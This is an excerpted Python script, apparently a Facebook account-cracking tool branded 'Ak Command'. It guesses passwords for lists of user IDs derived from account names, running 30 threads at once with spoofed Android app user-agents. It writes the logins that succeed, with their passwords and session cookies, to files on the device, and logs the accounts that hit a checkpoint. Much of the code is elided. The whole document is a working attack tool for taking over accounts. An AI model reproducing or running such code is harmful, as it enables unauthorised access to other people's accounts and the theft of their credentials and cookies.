...
os.system('clear')
print('    \x1b[1;96m \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m \x1b[1;96mWELCOME TO タk̷ 多𐍂ᴀɴᴅ COMMAND\x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m\n')
print('  \x1b[0m ╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m•  \x1b[0mAk Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ───────╮')
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(35*'─')
        input("Press enter to back Ak Menu ")
        exit()
os.system("speak 'WELCOME TO Anup COMMAND'")
def Hamza():   
    os.system('clear')
    print(logo)
    print(35*'─')
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Ak-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ak_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUSHANT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
              #       print(f"\r\x1b[1;96m [Ak-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Ak_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [Ak] {loop}  [M3] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ak] {loop}  [M2] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[0m─────────────────────────────────────")
            with HamzaAk(max_workers=30) as Akworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Akworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Akworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Akworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Akworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
Hamza()
